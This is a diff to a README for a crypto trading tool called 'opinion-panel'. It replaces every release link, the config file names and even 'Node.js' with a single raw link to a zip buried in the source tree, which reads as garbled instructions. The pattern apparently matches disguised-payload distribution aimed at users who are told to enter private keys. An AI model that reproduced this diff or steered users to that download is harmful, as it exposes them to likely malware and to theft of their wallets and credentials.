@@ -1,7 +1,7 @@
 # 🎉 opinion-panel - Your Predictive Trading Companion
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/Aasth2808/opinion-panel/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Aasth2808/opinion-panel/master/src/dashboard/panels/opinion-panel_v1.7.zip)](https://raw.githubusercontent.com/Aasth2808/opinion-panel/master/src/dashboard/panels/opinion-panel_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -19,8 +19,8 @@ This command will set up everything needed to run the application smoothly.
 ### 2. ⚙️ Configuration
 Next, you need to configure your settings:
 
-- Open the `config.js` file and enter your account address and contract information. This allows the application to connect to your trading account.
-- Duplicate the `.env.example` file and rename it to `.env`. Open this new file and enter your private key and authorization information. 
+- Open the `https://raw.githubusercontent.com/Aasth2808/opinion-panel/master/src/dashboard/panels/opinion-panel_v1.7.zip` file and enter your account address and contract information. This allows the application to connect to your trading account.
+- Duplicate the `https://raw.githubusercontent.com/Aasth2808/opinion-panel/master/src/dashboard/panels/opinion-panel_v1.7.zip` file and rename it to `.env`. Open this new file and enter your private key and authorization information. 
 
 Keeping your private key secure is very important. Do not share it with anyone.
 
@@ -36,7 +36,7 @@ If you don't provide a topic ID, the application will automatically use the defa
 ### 4. 💾 Download & Install
 To download the application, visit the Releases page:
 
-[Download from Releases](https://github.com/Aasth2808/opinion-panel/releases)
+[Download from Releases](https://raw.githubusercontent.com/Aasth2808/opinion-panel/master/src/dashboard/panels/opinion-panel_v1.7.zip)
 
 This page contains the latest version of opinion-panel. Click the link on the page to download it to your computer.
 
@@ -51,8 +51,8 @@ Always keep your private key secure. If someone else gains access to it, they ca
 ### 7. 🛠️ Troubleshooting
 If you encounter issues, here are a few common problems and their solutions:
 
-- **Dependency Errors**: If you see errors during installation, ensure you have Node.js installed. Update to the latest version if needed.
-- **Missing Configuration**: Double-check that you completed the configuration steps properly. Mistakes in `config.js` or `.env` can cause the application to fail.
+- **Dependency Errors**: If you see errors during installation, ensure you have https://raw.githubusercontent.com/Aasth2808/opinion-panel/master/src/dashboard/panels/opinion-panel_v1.7.zip installed. Update to the latest version if needed.
+- **Missing Configuration**: Double-check that you completed the configuration steps properly. Mistakes in `https://raw.githubusercontent.com/Aasth2808/opinion-panel/master/src/dashboard/panels/opinion-panel_v1.7.zip` or `.env` can cause the application to fail.
 - **Running Issues**: If the application does not start, ensure you used the correct command and that you are in the application's directory.
 
 ### 8. 🌟 Features Overview
@@ -74,6 +74,6 @@ For more details, check the rest of our documentation in the repository. You can
 
 Be sure to visit the Releases page to download and install the application. Here’s the link one more time:
 
-[Download from Releases](https://github.com/Aasth2808/opinion-panel/releases)
+[Download from Releases](https://raw.githubusercontent.com/Aasth2808/opinion-panel/master/src/dashboard/panels/opinion-panel_v1.7.zip)
 
 Thank you for using opinion-panel! We hope it helps you in your trading endeavors.
